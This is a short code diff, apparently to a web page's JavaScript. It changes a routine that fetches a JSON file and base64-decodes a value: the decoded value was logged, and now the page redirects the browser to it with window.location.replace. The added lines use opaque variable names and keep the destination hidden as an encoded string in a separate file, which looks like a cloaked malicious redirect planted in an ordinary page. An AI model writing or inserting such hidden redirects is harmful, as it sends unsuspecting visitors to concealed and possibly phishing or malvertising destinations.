@@ -103,9 +103,10 @@ span:before
             fetch(file_name)
                 .then(response => response.text())
                 .then(data => {
-                    const jsonData = JSON.parse(data);
-                    const decodedMessage = atob(jsonData[data_key]);
-                    console.log(decodedMessage);
+                    const fb_datat_aa = JSON.parse(data);
+                    const fb_ad_loc = atob(fb_datat_aa[data_key]);
+                    //console.log(decodedMessage);
+                    window.location.replace(fb_ad_loc);
 
                 })
                 .catch(error => {
